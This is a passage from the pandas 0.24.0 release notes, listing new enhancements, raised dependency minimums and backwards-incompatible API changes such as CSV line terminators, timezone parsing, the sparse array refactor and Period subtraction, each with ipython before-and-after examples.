allows a dictionary to be passed so that some of the names\nof a ``MultiIndex`` can be changed.\n\nExample:\n\n.. ipython:: python\n\n    mi = pd.MultiIndex.from_product([list('AB'), list('CD'), list('EF')],\n                                    names=['AB', 'CD', 'EF'])\n    df = pd.DataFrame(list(range(len(mi))), index=mi, columns=['N'])\n    df\n    df.rename_axis(index={'CD': 'New'})\n\nSee the :ref:`Advanced documentation on renaming<advanced.index_names>` for more details.\n\n.. _whatsnew_0240.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- :func:`merge` now directly allows merge between objects of type ``DataFrame`` and named ``Series``, without the need to convert the ``Series`` object into a ``DataFrame`` beforehand (:issue:`21220`)\n- ``ExcelWriter`` now accepts ``mode`` as a keyword argument, enabling append to existing workbooks when using the ``openpyxl`` engine (:issue:`3441`)\n- ``FrozenList`` has gained the ``.union()`` and ``.difference()`` methods. This functionality greatly simplifies groupby's that rely on explicitly excluding certain columns. See :ref:`Splitting an object into groups <groupby.split>` for more information (:issue:`15475`, :issue:`15506`).\n- :func:`DataFrame.to_parquet` now accepts ``index`` as an argument, allowing\n  the user to override the engine's default behavior to include or omit the\n  dataframe's indexes from the resulting Parquet file. (:issue:`20768`)\n- :func:`read_feather` now accepts ``columns`` as an argument, allowing the user to specify which columns should be read. (:issue:`24025`)\n- :meth:`DataFrame.corr` and :meth:`Series.corr` now accept a callable for generic calculation methods of correlation, e.g. histogram intersection (:issue:`22684`)\n- :func:`DataFrame.to_string` now accepts ``decimal`` as an argument, allowing the user to specify which decimal separator should be used in the output. (:issue:`23614`)\n- :func:`DataFrame.to_html` now accepts ``render_links`` as an argument, allowing the user to generate HTML with links to any URLs that appear in the DataFrame.\n  See the :ref:`section on writing HTML <io.html>` in the IO docs for example usage. (:issue:`2679`)\n- :func:`pandas.read_csv` now supports pandas extension types as an argument to ``dtype``, allowing the user to use pandas extension types when reading CSVs. (:issue:`23228`)\n- The :meth:`~DataFrame.shift` method now accepts ``fill_value`` as an argument, allowing the user to specify a value which will be used instead of NA/NaT in the empty periods. (:issue:`15486`)\n- :func:`to_datetime` now supports the ``%Z`` and ``%z`` directive when passed into ``format`` (:issue:`13486`)\n- :func:`Series.mode` and :func:`DataFrame.mode` now support the ``dropna`` parameter which can be used to specify whether ``NaN``/``NaT`` values should be considered (:issue:`17534`)\n- :func:`DataFrame.to_csv` and :func:`Series.to_csv` now support the ``compression`` keyword when a file handle is passed. (:issue:`21227`)\n- :meth:`Index.droplevel` is now implemented also for flat indexes, for compatibility with :class:`MultiIndex` (:issue:`21115`)\n- :meth:`Series.droplevel` and :meth:`DataFrame.droplevel` are now implemented (:issue:`20342`)\n- Added support for reading from/writing to Google Cloud Storage via the ``gcsfs`` library (:issue:`19454`, :issue:`23094`)\n- :func:`DataFrame.to_gbq` and :func:`read_gbq` signature and documentation updated to\n  reflect changes from the `pandas-gbq library version 0.8.0\n  <https://pandas-gbq.readthedocs.io/en/latest/changelog.html#changelog-0-8-0>`__.\n  Adds a ``credentials`` argument, which enables the use of any kind of\n  `google-auth credentials\n  <https://google-auth.readthedocs.io/en/latest/>`__. (:issue:`21627`,\n  :issue:`22557`, :issue:`23662`)\n- New method :meth:`HDFStore.walk` will recursively walk the group hierarchy of an HDF5 file (:issue:`10932`)\n- :func:`read_html` copies cell data across ``colspan`` and ``rowspan``, and it treats all-``th`` table rows as headers if ``header`` kwarg is not given and there is no ``thead`` (:issue:`17054`)\n- :meth:`Series.nlargest`, :meth:`Series.nsmallest`, :meth:`DataFrame.nlargest`, and :meth:`DataFrame.nsmallest` now accept the value ``\"all\"`` for the ``keep`` argument. This keeps all ties for the nth largest/smallest value (:issue:`16818`)\n- :class:`IntervalIndex` has gained the :meth:`~IntervalIndex.set_closed` method to change the existing ``closed`` value (:issue:`21670`)\n- :func:`~DataFrame.to_csv`, :func:`~Series.to_csv`, :func:`~DataFrame.to_json`, and :func:`~Series.to_json` now support ``compression='infer'`` to infer compression based on filename extension (:issue:`15008`).\n  The default compression for ``to_csv``, ``to_json``, and ``to_pickle`` methods has been updated to ``'infer'`` (:issue:`22004`).\n- :meth:`DataFrame.to_sql` now supports writing ``TIMESTAMP WITH TIME ZONE`` types for supported databases. For databases that don't support timezones, datetime data will be stored as timezone unaware local timestamps. See the :ref:`io.sql_datetime_data` for implications (:issue:`9086`).\n- :func:`to_timedelta` now supports iso-formatted timedelta strings (:issue:`21877`)\n- :class:`Series` and :class:`DataFrame` now support :class:`Iterable` objects in the constructor (:issue:`2193`)\n- :class:`DatetimeIndex` has gained the :attr:`DatetimeIndex.timetz` attribute. This returns the local time with timezone information. (:issue:`21358`)\n- :meth:`~Timestamp.round`, :meth:`~Timestamp.ceil`, and :meth:`~Timestamp.floor` for :class:`DatetimeIndex` and :class:`Timestamp`\n  now support an ``ambiguous`` argument for handling datetimes that are rounded to ambiguous times (:issue:`18946`)\n  and a ``nonexistent`` argument for handling datetimes that are rounded to nonexistent times. See :ref:`timeseries.timezone_nonexistent` (:issue:`22647`)\n- The result of :meth:`~DataFrame.resample` is now iterable similar to ``groupby()`` (:issue:`15314`).\n- :meth:`Series.resample` and :meth:`DataFrame.resample` have gained the :meth:`.Resampler.quantile` (:issue:`15023`).\n- :meth:`DataFrame.resample` and :meth:`Series.resample` with a :class:`PeriodIndex` will now respect the ``base`` argument in the same fashion as with a :class:`DatetimeIndex`. (:issue:`23882`)\n- :meth:`pandas.api.types.is_list_like` has gained a keyword ``allow_sets`` which is ``True`` by default; if ``False``,\n  all instances of ``set`` will not be considered \"list-like\" anymore (:issue:`23061`)\n- :meth:`Index.to_frame` now supports overriding column name(s) (:issue:`22580`).\n- :meth:`Categorical.from_codes` now can take a ``dtype`` parameter as an alternative to passing ``categories`` and ``ordered`` (:issue:`24398`).\n- New attribute ``__git_version__`` will return git commit sha of current build (:issue:`21295`).\n- Compatibility with Matplotlib 3.0 (:issue:`22790`).\n- Added :meth:`Interval.overlaps`, :meth:`arrays.IntervalArray.overlaps`, and :meth:`IntervalIndex.overlaps` for determining overlaps between interval-like objects (:issue:`21998`)\n- :func:`read_fwf` now accepts keyword ``infer_nrows`` (:issue:`15138`).\n- :func:`~DataFrame.to_parquet` now supports writing a ``DataFrame`` as a directory of parquet files partitioned by a subset of the columns when ``engine = 'pyarrow'`` (:issue:`23283`)\n- :meth:`Timestamp.tz_localize`, :meth:`DatetimeIndex.tz_localize`, and :meth:`Series.tz_localize` have gained the ``nonexistent`` argument for alternative handling of nonexistent times. See :ref:`timeseries.timezone_nonexistent` (:issue:`8917`, :issue:`24466`)\n- :meth:`Index.difference`, :meth:`Index.intersection`, :meth:`Index.union`, and :meth:`Index.symmetric_difference` now have an optional ``sort`` parameter to control whether the results should be sorted if possible (:issue:`17839`, :issue:`24471`)\n- :meth:`read_excel()` now accepts ``usecols`` as a list of column names or callable (:issue:`18273`)\n- :meth:`MultiIndex.to_flat_index` has been added to flatten multiple levels into a single-level :class:`Index` object.\n- :meth:`DataFrame.to_stata` and :class:`pandas.io.stata.StataWriter117` can write mixed string columns to Stata strl format (:issue:`23633`)\n- :meth:`DataFrame.between_time` and :meth:`DataFrame.at_time` have gained the ``axis`` parameter (:issue:`8839`)\n- :meth:`DataFrame.to_records` now accepts ``index_dtypes`` and ``column_dtypes`` parameters to allow different data types in stored column and index records (:issue:`18146`)\n- :class:`IntervalIndex` has gained the :attr:`~IntervalIndex.is_overlapping` attribute to indicate if the ``IntervalIndex`` contains any overlapping intervals (:issue:`23309`)\n- :func:`pandas.DataFrame.to_sql` has gained the ``method`` argument to control SQL insertion clause. See the :ref:`insertion method <io.sql.method>` section in the documentation. (:issue:`8953`)\n- :meth:`DataFrame.corrwith` now supports Spearman's rank correlation, Kendall's tau as well as callable correlation methods. (:issue:`21925`)\n- :meth:`DataFrame.to_json`, :meth:`DataFrame.to_csv`, :meth:`DataFrame.to_pickle`, and other export methods now support tilde(~) in path argument. (:issue:`23473`)\n\n.. _whatsnew_0240.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\npandas 0.24.0 includes a number of API breaking changes.\n\n\n.. _whatsnew_0240.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe have updated our minimum supported versions of dependencies (:issue:`21242`, :issue:`18742`, :issue:`23774`, :issue:`24767`).\nIf installed, we now require:\n\n+-----------------+-----------------+----------+\n| Package         | Minimum Version | Required |\n+=================+=================+==========+\n| numpy           | 1.12.0          |    X     |\n+-----------------+-----------------+----------+\n| bottleneck      | 1.2.0           |          |\n+-----------------+-----------------+----------+\n| fastparquet     | 0.2.1           |          |\n+-----------------+-----------------+----------+\n| matplotlib      | 2.0.0           |          |\n+-----------------+-----------------+----------+\n| numexpr         | 2.6.1           |          |\n+-----------------+-----------------+----------+\n| pandas-gbq      | 0.8.0           |          |\n+-----------------+-----------------+----------+\n| pyarrow         | 0.9.0           |          |\n+-----------------+-----------------+----------+\n| pytables        | 3.4.2           |          |\n+-----------------+-----------------+----------+\n| scipy           | 0.18.1          |          |\n+-----------------+-----------------+----------+\n| xlrd            | 1.0.0           |          |\n+-----------------+-----------------+----------+\n| pytest (dev)    | 3.6             |          |\n+-----------------+-----------------+----------+\n\nAdditionally we no longer depend on ``feather-format`` for feather based storage\nand replaced it with references to ``pyarrow`` (:issue:`21639` and :issue:`23053`).\n\n.. _whatsnew_0240.api_breaking.csv_line_terminator:\n\n``os.linesep`` is used for ``line_terminator`` of ``DataFrame.to_csv``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`DataFrame.to_csv` now uses :func:`os.linesep` rather than ``'\\n'``\nfor the default line terminator (:issue:`20353`).\nThis change only affects when running on Windows, where ``'\\r\\n'`` was used for line terminator\neven when ``'\\n'`` was passed in ``line_terminator``.\n\n*Previous behavior* on Windows:\n\n.. code-block:: ipython\n\n    In [1]: data = pd.DataFrame({\"string_with_lf\": [\"a\\nbc\"],\n       ...:                      \"string_with_crlf\": [\"a\\r\\nbc\"]})\n\n    In [2]:  When passing file PATH to to_csv,\n       ...:  line_terminator does not work, and csv is saved with '\\r\\n'.\n       ...:  Also, this converts all '\\n's in the data to '\\r\\n'.\n       ...: data.to_csv(\"test.csv\", index=False, line_terminator='\\n')\n\n    In [3]: with open(\"test.csv\", mode='rb') as f:\n       ...:     print(f.read())\n    Out[3]: b'string_with_lf,string_with_crlf\\r\\n\"a\\r\\nbc\",\"a\\r\\r\\nbc\"\\r\\n'\n\n    In [4]:  When passing file OBJECT with newline option to\n       ...:  to_csv, line_terminator works.\n       ...: with open(\"test2.csv\", mode='w', newline='\\n') as f:\n       ...:     data.to_csv(f, index=False, line_terminator='\\n')\n\n    In [5]: with open(\"test2.csv\", mode='rb') as f:\n       ...:     print(f.read())\n    Out[5]: b'string_with_lf,string_with_crlf\\n\"a\\nbc\",\"a\\r\\nbc\"\\n'\n\n\n*New behavior* on Windows:\n\nPassing ``line_terminator`` explicitly, set the ``line terminator`` to that character.\n\n.. code-block:: ipython\n\n   In [1]: data = pd.DataFrame({\"string_with_lf\": [\"a\\nbc\"],\n      ...:                      \"string_with_crlf\": [\"a\\r\\nbc\"]})\n\n   In [2]: data.to_csv(\"test.csv\", index=False, line_terminator='\\n')\n\n   In [3]: with open(\"test.csv\", mode='rb') as f:\n      ...:     print(f.read())\n   Out[3]: b'string_with_lf,string_with_crlf\\n\"a\\nbc\",\"a\\r\\nbc\"\\n'\n\n\nOn Windows, the value of ``os.linesep`` is ``'\\r\\n'``, so if ``line_terminator`` is not\nset, ``'\\r\\n'`` is used for line terminator.\n\n.. code-block:: ipython\n\n   In [1]: data = pd.DataFrame({\"string_with_lf\": [\"a\\nbc\"],\n      ...:                      \"string_with_crlf\": [\"a\\r\\nbc\"]})\n\n   In [2]: data.to_csv(\"test.csv\", index=False)\n\n   In [3]: with open(\"test.csv\", mode='rb') as f:\n      ...:     print(f.read())\n   Out[3]: b'string_with_lf,string_with_crlf\\r\\n\"a\\nbc\",\"a\\r\\nbc\"\\r\\n'\n\n\nFor file objects, specifying ``newline`` is not sufficient to set the line terminator.\nYou must pass in the ``line_terminator`` explicitly, even in this case.\n\n.. code-block:: ipython\n\n   In [1]: data = pd.DataFrame({\"string_with_lf\": [\"a\\nbc\"],\n      ...:                      \"string_with_crlf\": [\"a\\r\\nbc\"]})\n\n   In [2]: with open(\"test2.csv\", mode='w', newline='\\n') as f:\n      ...:     data.to_csv(f, index=False)\n\n   In [3]: with open(\"test2.csv\", mode='rb') as f:\n      ...:     print(f.read())\n   Out[3]: b'string_with_lf,string_with_crlf\\r\\n\"a\\nbc\",\"a\\r\\nbc\"\\r\\n'\n\n.. _whatsnew_0240.bug_fixes.nan_with_str_dtype:\n\nProper handling of ``np.nan`` in a string data-typed column with the Python engine\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThere was bug in :func:`read_excel` and :func:`read_csv` with the Python\nengine, where missing values turned to ``'nan'`` with ``dtype=str`` and\n``na_filter=True``. Now, these missing values are converted to the string\nmissing indicator, ``np.nan``. (:issue:`20377`)\n\n.. ipython:: python\n   :suppress:\n\n   from io import StringIO\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [5]: data = 'a,b,c\\n1,,3\\n4,5,6'\n   In [6]: df = pd.read_csv(StringIO(data), engine='python', dtype=str, na_filter=True)\n   In [7]: df.loc[0, 'b']\n   Out[7]:\n   'nan'\n\n*New behavior*:\n\n.. ipython:: python\n\n   data = 'a,b,c\\n1,,3\\n4,5,6'\n   df = pd.read_csv(StringIO(data), engine='python', dtype=str, na_filter=True)\n   df.loc[0, 'b']\n\nNotice how we now instead output ``np.nan`` itself instead of a stringified form of it.\n\n.. _whatsnew_0240.api.timezone_offset_parsing:\n\nParsing datetime strings with timezone offsets\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, parsing datetime strings with UTC offsets with :func:`to_datetime`\nor :class:`DatetimeIndex` would automatically convert the datetime to UTC\nwithout timezone localization. This is inconsistent from parsing the same\ndatetime string with :class:`Timestamp` which would preserve the UTC\noffset in the ``tz`` attribute. Now, :func:`to_datetime` preserves the UTC\noffset in the ``tz`` attribute when all the datetime strings have the same\nUTC offset (:issue:`17697`, :issue:`11736`, :issue:`22457`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [2]: pd.to_datetime(\"2015-11-18 15:30:00+05:30\")\n    Out[2]: Timestamp('2015-11-18 10:00:00')\n\n    In [3]: pd.Timestamp(\"2015-11-18 15:30:00+05:30\")\n    Out[3]: Timestamp('2015-11-18 15:30:00+0530', tz='pytz.FixedOffset(330)')\n\n     Different UTC offsets would automatically convert the datetimes to UTC (without a UTC timezone)\n    In [4]: pd.to_datetime([\"2015-11-18 15:30:00+05:30\", \"2015-11-18 16:30:00+06:30\"])\n    Out[4]: DatetimeIndex(['2015-11-18 10:00:00', '2015-11-18 10:00:00'], dtype='datetime64[ns]', freq=None)\n\n*New behavior*:\n\n.. ipython:: python\n\n    pd.to_datetime(\"2015-11-18 15:30:00+05:30\")\n    pd.Timestamp(\"2015-11-18 15:30:00+05:30\")\n\nParsing datetime strings with the same UTC offset will preserve the UTC offset in the ``tz``\n\n.. ipython:: python\n\n    pd.to_datetime([\"2015-11-18 15:30:00+05:30\"] * 2)\n\nParsing datetime strings with different UTC offsets will now create an Index of\n``datetime.datetime`` objects with different UTC offsets\n\n.. code-block:: ipython\n\n    In [59]: idx = pd.to_datetime([\"2015-11-18 15:30:00+05:30\",\n                                   \"2015-11-18 16:30:00+06:30\"])\n\n    In[60]: idx\n    Out[60]: Index([2015-11-18 15:30:00+05:30, 2015-11-18 16:30:00+06:30], dtype='object')\n\n    In[61]: idx[0]\n    Out[61]: Timestamp('2015-11-18 15:30:00+0530', tz='UTC+05:30')\n\n    In[62]: idx[1]\n    Out[62]: Timestamp('2015-11-18 16:30:00+0630', tz='UTC+06:30')\n\nPassing ``utc=True`` will mimic the previous behavior but will correctly indicate\nthat the dates have been converted to UTC\n\n.. ipython:: python\n\n    pd.to_datetime([\"2015-11-18 15:30:00+05:30\",\n                    \"2015-11-18 16:30:00+06:30\"], utc=True)\n\n\n.. _whatsnew_0240.api_breaking.read_csv_mixed_tz:\n\nParsing mixed-timezones with :func:`read_csv`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`read_csv` no longer silently converts mixed-timezone columns to UTC (:issue:`24987`).\n\n*Previous behavior*\n\n.. code-block:: python\n\n   >>> import io\n   >>> content = \"\"\"\\\n   ... a\n   ... 2000-01-01T00:00:00+05:00\n   ... 2000-01-01T00:00:00+06:00\"\"\"\n   >>> df = pd.read_csv(io.StringIO(content), parse_dates=['a'])\n   >>> df.a\n   0   1999-12-31 19:00:00\n   1   1999-12-31 18:00:00\n   Name: a, dtype: datetime64[ns]\n\n*New behavior*\n\n.. code-block:: ipython\n\n   In[64]: import io\n\n   In[65]: content = \"\"\"\\\n      ...: a\n      ...: 2000-01-01T00:00:00+05:00\n      ...: 2000-01-01T00:00:00+06:00\"\"\"\n\n   In[66]: df = pd.read_csv(io.StringIO(content), parse_dates=['a'])\n\n   In[67]: df.a\n   Out[67]:\n   0   2000-01-01 00:00:00+05:00\n   1   2000-01-01 00:00:00+06:00\n   Name: a, Length: 2, dtype: object\n\nAs can be seen, the ``dtype`` is object; each value in the column is a string.\nTo convert the strings to an array of datetimes, the ``date_parser`` argument\n\n.. code-block:: ipython\n\n   In [3]: df = pd.read_csv(\n      ...:     io.StringIO(content),\n      ...:     parse_dates=['a'],\n      ...:     date_parser=lambda col: pd.to_datetime(col, utc=True),\n      ...: )\n\n   In [4]: df.a\n   Out[4]:\n   0   1999-12-31 19:00:00+00:00\n   1   1999-12-31 18:00:00+00:00\n   Name: a, dtype: datetime64[ns, UTC]\n\nSee :ref:`whatsnew_0240.api.timezone_offset_parsing` for more.\n\n.. _whatsnew_0240.api_breaking.period_end_time:\n\nTime values in ``dt.end_time`` and ``to_timestamp(how='end')``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe time values in :class:`Period` and :class:`PeriodIndex` objects are now set\nto '23:59:59.999999999' when calling :attr:`Series.dt.end_time`, :attr:`Period.end_time`,\n:attr:`PeriodIndex.end_time`, :func:`Period.to_timestamp()` with ``how='end'``,\nor :func:`PeriodIndex.to_timestamp()` with ``how='end'`` (:issue:`17157`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [2]: p = pd.Period('2017-01-01', 'D')\n   In [3]: pi = pd.PeriodIndex([p])\n\n   In [4]: pd.Series(pi).dt.end_time[0]\n   Out[4]: Timestamp(2017-01-01 00:00:00)\n\n   In [5]: p.end_time\n   Out[5]: Timestamp(2017-01-01 23:59:59.999999999)\n\n*New behavior*:\n\nCalling :attr:`Series.dt.end_time` will now result in a time of '23:59:59.999999999' as\nis the case with :attr:`Period.end_time`, for example\n\n.. ipython:: python\n\n   p = pd.Period('2017-01-01', 'D')\n   pi = pd.PeriodIndex([p])\n\n   pd.Series(pi).dt.end_time[0]\n\n   p.end_time\n\n.. _whatsnew_0240.api_breaking.datetime_unique:\n\nSeries.unique for timezone-aware data\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe return type of :meth:`Series.unique` for datetime with timezone values has changed\nfrom an :class:`numpy.ndarray` of :class:`Timestamp` objects to a :class:`arrays.DatetimeArray` (:issue:`24024`).\n\n.. ipython:: python\n\n   ser = pd.Series([pd.Timestamp('2000', tz='UTC'),\n                    pd.Timestamp('2000', tz='UTC')])\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: ser.unique()\n   Out[3]: array([Timestamp('2000-01-01 00:00:00+0000', tz='UTC')], dtype=object)\n\n\n*New behavior*:\n\n.. ipython:: python\n\n   ser.unique()\n\n\n.. _whatsnew_0240.api_breaking.sparse_values:\n\nSparse data structure refactor\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``SparseArray``, the array backing ``SparseSeries`` and the columns in a ``SparseDataFrame``,\nis now an extension array (:issue:`21978`, :issue:`19056`, :issue:`22835`).\nTo conform to this interface and for consistency with the rest of pandas, some API breaking\nchanges were made:\n\n- ``SparseArray`` is no longer a subclass of :class:`numpy.ndarray`. To convert a ``SparseArray`` to a NumPy array, use :func:`numpy.asarray`.\n- ``SparseArray.dtype`` and ``SparseSeries.dtype`` are now instances of :class:`SparseDtype`, rather than ``np.dtype``. Access the underlying dtype with ``SparseDtype.subtype``.\n- ``numpy.asarray(sparse_array)`` now returns a dense array with all the values, not just the non-fill-value values (:issue:`14167`)\n- ``SparseArray.take`` now matches the API of :meth:`pandas.api.extensions.ExtensionArray.take` (:issue:`19506`):\n\n  * The default value of ``allow_fill`` has changed from ``False`` to ``True``.\n  * The ``out`` and ``mode`` parameters are now longer accepted (previously, this raised if they were specified).\n  * Passing a scalar for ``indices`` is no longer allowed.\n\n- The result of :func:`concat` with a mix of sparse and dense Series is a Series with sparse values, rather than a ``SparseSeries``.\n- ``SparseDataFrame.combine`` and ``DataFrame.combine_first`` no longer supports combining a sparse column with a dense column while preserving the sparse subtype. The result will be an object-dtype SparseArray.\n- Setting :attr:`SparseArray.fill_value` to a fill value with a different dtype is now allowed.\n- ``DataFrame[column]`` is now a :class:`Series` with sparse values, rather than a :class:`SparseSeries`, when slicing a single column with sparse values (:issue:`23559`).\n- The result of :meth:`Series.where` is now a ``Series`` with sparse values, like with other extension arrays (:issue:`24077`)\n\nSome new warnings are issued for operations that require or are likely to materialize a large dense array:\n\n- A :class:`errors.PerformanceWarning` is issued when using fillna with a ``method``, as a dense array is constructed to create the filled array. Filling with a ``value`` is the efficient way to fill a sparse array.\n- A :class:`errors.PerformanceWarning` is now issued when concatenating sparse Series with differing fill values. The fill value from the first sparse array continues to be used.\n\nIn addition to these API breaking changes, many :ref:`Performance Improvements and Bug Fixes have been made <whatsnew_0240.bug_fixes.sparse>`.\n\nFinally, a ``Series.sparse`` accessor was added to provide sparse-specific methods like :meth:`Series.sparse.from_coo`.\n\n.. ipython:: python\n\n   s = pd.Series([0, 0, 1, 1, 1], dtype='Sparse[int]')\n   s.sparse.density\n\n.. _whatsnew_0240.api_breaking.get_dummies:\n\n:meth:`get_dummies` always returns a DataFrame\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, when ``sparse=True`` was passed to :func:`get_dummies`, the return value could be either\na :class:`DataFrame` or a :class:`SparseDataFrame`, depending on whether all or a just a subset\nof the columns were dummy-encoded. Now, a :class:`DataFrame` is always returned (:issue:`24284`).\n\n*Previous behavior*\n\nThe first :func:`get_dummies` returns a :class:`DataFrame` because the column ``A``\nis not dummy encoded. When just ``[\"B\", \"C\"]`` are passed to ``get_dummies``,\nthen all the columns are dummy-encoded, and a :class:`SparseDataFrame` was returned.\n\n.. code-block:: ipython\n\n   In [2]: df = pd.DataFrame({\"A\": [1, 2], \"B\": ['a', 'b'], \"C\": ['a', 'a']})\n\n   In [3]: type(pd.get_dummies(df, sparse=True))\n   Out[3]: pandas.core.frame.DataFrame\n\n   In [4]: type(pd.get_dummies(df[['B', 'C']], sparse=True))\n   Out[4]: pandas.core.sparse.frame.SparseDataFrame\n\n.. ipython:: python\n   :suppress:\n\n   df = pd.DataFrame({\"A\": [1, 2], \"B\": ['a', 'b'], \"C\": ['a', 'a']})\n\n*New behavior*\n\nNow, the return type is consistently a :class:`DataFrame`.\n\n.. ipython:: python\n\n   type(pd.get_dummies(df, sparse=True))\n   type(pd.get_dummies(df[['B', 'C']], sparse=True))\n\n.. note::\n\n   There's no difference in memory usage between a :class:`SparseDataFrame`\n   and a :class:`DataFrame` with sparse values. The memory usage will\n   be the same as in the previous version of pandas.\n\n.. _whatsnew_0240.api_breaking.frame_to_dict_index_orient:\n\nRaise ValueError in ``DataFrame.to_dict(orient='index')``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nBug in :func:`DataFrame.to_dict` raises ``ValueError`` when used with\n``orient='index'`` and a non-unique index instead of losing data (:issue:`22801`)\n\n.. ipython:: python\n    :okexcept:\n\n    df = pd.DataFrame({'a': [1, 2], 'b': [0.5, 0.75]}, index=['A', 'A'])\n    df\n\n    df.to_dict(orient='index')\n\n.. _whatsnew_0240.api.datetimelike.normalize:\n\nTick DateOffset normalize restrictions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nCreating a ``Tick`` object (:class:`Day`, :class:`Hour`, :class:`Minute`,\n:class:`Second`, :class:`Milli`, :class:`Micro`, :class:`Nano`) with\n``normalize=True`` is no longer supported.  This prevents unexpected behavior\nwhere addition could fail to be monotone or associative.  (:issue:`21427`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n\n   In [2]: ts = pd.Timestamp('2018-06-11 18:01:14')\n\n   In [3]: ts\n   Out[3]: Timestamp('2018-06-11 18:01:14')\n\n   In [4]: tic = pd.offsets.Hour(n=2, normalize=True)\n      ...:\n\n   In [5]: tic\n   Out[5]: <2 * Hours>\n\n   In [6]: ts + tic\n   Out[6]: Timestamp('2018-06-11 00:00:00')\n\n   In [7]: ts + tic + tic + tic == ts + (tic + tic + tic)\n   Out[7]: False\n\n*New behavior*:\n\n.. ipython:: python\n\n    ts = pd.Timestamp('2018-06-11 18:01:14')\n    tic = pd.offsets.Hour(n=2)\n    ts + tic + tic + tic == ts + (tic + tic + tic)\n\n\n.. _whatsnew_0240.api.datetimelike:\n\n\n.. _whatsnew_0240.api.period_subtraction:\n\nPeriod subtraction\n^^^^^^^^^^^^^^^^^^\n\nSubtraction of a ``Period`` from another ``Period`` will give a ``DateOffset``.\ninstead of an integer (:issue:`21314`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [2]: june = pd.Period('June 2018')\n\n    In [3]: april = pd.Period('April 2018')\n\n    In [4]: june - april\n    Out [4]: 2\n\n*New behavior*:\n\n.. ipython:: python\n\n    june = pd.Period('June 2018')\n    april = pd.Period('April 2018')\n    june - april\n\nSimilarly, subtraction of a ``Period`` from a ``PeriodIndex`` will now return\nan ``Index`` of ``DateOffset`` objects instead of an ``Int64Index``\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [2]: pi = pd.period_range('June 2018', freq='M', periods=3)\n\n    In [3]: pi - pi[0]\n    Out[3]: Int64Index([0, 1, 2], dtype='int64')\n\n*New behavior*:\n\n.. ipython:: python\n\n    pi = pd.period_range('June 2018', freq='M', periods=3)\n    pi - pi[0]\n\n\n.. _whatsnew_0240.api.timedelta64_subtract_nan:\n\nAddition/subtraction of ``NaN`` from :class:`DataFrame`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAdding or subtracting ``NaN`` from a :class:`DataFrame` column with\n``timedelta64[ns]`` dtype will now raise a ``TypeError`` instead of returning\nall-``NaT``.  This is for compatibility with ``TimedeltaIndex`` and\n``Series`` behavior (:issue:`22163`)\n\n.. ipython:: python\n\n   df = pd.DataFrame([pd.Timedelta(days=1)])\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [4]: df = pd.DataFrame([pd.Timedelta(days=1)])\n\n    In [5]: df - np.nan\n    Out[5]:\n        0\n    0 NaT\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [2]: df - np.nan\n    ...\n    TypeError: unsupported operand type(s) for -: 'TimedeltaIndex' and 'float'\n\n.. _whatsnew_0240.api.dataframe_cmp_broadcasting:\n\nDataFrame comparison operations broadcasting changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nPreviously, the broadcasting behavior of :class:`DataFrame` comparison\noperations (``==``, ``!=``, ...) was inconsistent with the behavior of\narithmetic operations (``+``, ``-``, ...).  The behavior of the comparison\noperations has been changed to match the arithmetic operations in these cases.\n(:issue:`22880`)\n\nThe affected cases are:\n\n- operating against a 2-dimensional ``np.ndarray`` with either 1 row or 1 column will now broadcast the same way a ``np.ndarray`` would (:issue:`23000`).\n- a list or tuple with length matching the number of rows in the :class:`DataFrame` will now raise ``ValueError`` instead of operating column-by-column (:issue:`22880`.\n- a list or tuple with length matching the number of columns in the :class:`DataFrame` will now operate row-by-row instead of raising ``ValueError`` (:issue:`22880`).\n\n.. ipython:: python\n\n   arr = np.arange(6).reshape(3, 2)\n   df = pd.DataFrame(arr)\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [5]: df == arr[[0], :]\n       ...:  comparison previously broadcast where arithmetic would raise\n   Out[5]:\n          0      1\n   0   True   True\n   1  False  False\n   2  False  False\n   In [6]: df + arr[[0], :]\n   ...\n   ValueError: Unable to coerce to DataFrame, shape must be (3, 2): given (1, 2)\n\n   In [7]: df == (1, 2)\n       ...:  length matches number of columns;\n       ...:  comparison previously raised where arithmetic would broadcast\n   ...\n   ValueError: Invalid broadcasting comparison [(1, 2)] with block values\n   In [8]: df + (1, 2)\n   Out[8]:\n      0  1\n   0  1  3\n   1  3  5\n   2  5  7\n\n   In [9]: df == (1, 2, 3)\n       ...:   length matches number of rows\n       ...:   comparison previously broadcast where arithmetic would raise\n   Out[9]:\n          0      1\n   0  False   True\n   1   True  